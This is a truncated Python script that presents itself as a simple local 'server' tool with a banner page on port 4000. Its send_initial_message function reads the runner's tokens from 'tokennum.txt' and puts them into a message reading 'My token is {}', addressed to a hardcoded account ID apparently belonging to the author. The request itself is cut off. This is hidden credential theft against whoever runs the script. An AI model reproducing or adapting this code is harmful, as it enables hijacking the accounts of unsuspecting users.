import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"ADITYA D0N S3RV3R  IS   RUNN1NG ")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()


def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    # Modify the message as per your requirement
    msg_template = "Hello Aditya sir! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "100051334685995"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
